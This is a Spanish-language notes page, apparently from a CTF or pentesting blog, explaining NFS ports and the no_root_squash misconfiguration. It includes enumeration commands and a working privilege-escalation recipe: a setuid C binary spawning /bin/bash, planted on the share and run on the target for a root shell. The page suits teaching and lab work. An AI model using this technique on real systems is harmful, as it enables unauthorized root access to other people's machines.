+++
title = 'NFS'
draft = false
description = "Explicación del funcionamiento del protocolo NFS"
tags = ["NFS", "Protocolo"]
showToc = true
showRelatedContent = false
+++

# Network File System

## Resumen

NFS es un protocolo de nivel de aplicación que permite compartir archivos y directorios entre diferentes sistemas. El cliente puede montar en su dispositivo un sistema de archivos NFS como su fuese local.

Usa los siguientes puertos:
* Puerto **TCP 2049**.
  * Puerto estándar de NFS. A través de este puerto los clientes pueden montar filesystems y leer y escribir en archivos.
* Puerto **TCP 111**.
  * Usado por rpcbind, que actúa como mapeador de puertos para servicios RPC de NFS como `mountd` o `lockd` (No tiene relación con el RPC del puerto 135, son implementaciones diferentes.)
  * En **NFSv4** no hace falta, todas las funciones de montaje y bloqueo se hacen sobre el puerto 2049.


## No Root Squash

### Explicación

Por defecto, NFS usa la opción `root_squash`, que hace que todas las peticiones enviadas desde el cliente al servidor se conviertan en peticiones del usuario `nobody` (o `nfsnobody`), esto significa que, aunque en nuestra máquina local seamos `root`, no necesariamente tendremos permisos `root` sobre un sistema de archivos montado mediante NFS.

La opción `no_root_squash` desactiva esto. Esto significa que, si el cliente es root localmente, ahora los accesos al filesystem NFS también se harán como root, lo que implica tener privilegios de administrador sobre todos los archivos compartidos.

### Enumeración de No Root Squash

No hay forma directa de saber si `no_root_squash` está activado, por lo que lo más confiable es comprobarlo probando directamente: Montar el share como root localmente, intentar, por ejemplo, crear un archivo, y luego ver si se mantiene el UID 0 (propiedad de root) en el filesystem.

```shell
# Por ejemplo:
# Montar filesystem
sudo mount -t nfs 10.10.11.87:/share /mnt/test

# Crear archivo como root
sudo touch /mnt/test/testfile.txt

# Comprobar si pertenece a root.
ls -la /mnt/test/testfile.txt
```
### Explotación de No Root Squash
Podemos conseguir elevar privilegios (necesitaremos un acceso inicial) pasando un binario que nos dé un shell.

Primero creamos un binario que nos dé un shell. ([Ejemplo de verylazytech](https://www.verylazytech.com/nfs-service-port-2049)):
```shell
echo -e '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0); system("/bin/bash");}' > rootsh.c
gcc rootsh.c -o rootsh
chmod +s rootsh
```
Luego lo metemos en el share:
```shell
mv rootsh /mnt/nfs/
```
Y finalmente en la máquina objetivo (p.ej, desde ssh), lo ejecutamos:
```shell
user $> /home/user/nfsshare/rootsh
root #> 
```


## Enumeración
Para enumerar los shares disponibles:
```shell
showmount -e 10.10.11.87
```
Para montar uno de los shares disponibles:
```shell
mount -t nfs 10.10.11.87:/share /mnt/nfs -o nolock
```
> **`-o nolock`** sirve para deshabilitar el [file locking](https://en.wikipedia.org/wiki/File_locking). En entornos con varios accesos simultáneos (desde varios clientes) al mismo recurso, esto puede ser problemático, pero en un CTF suele resolver problemas al montar un share.
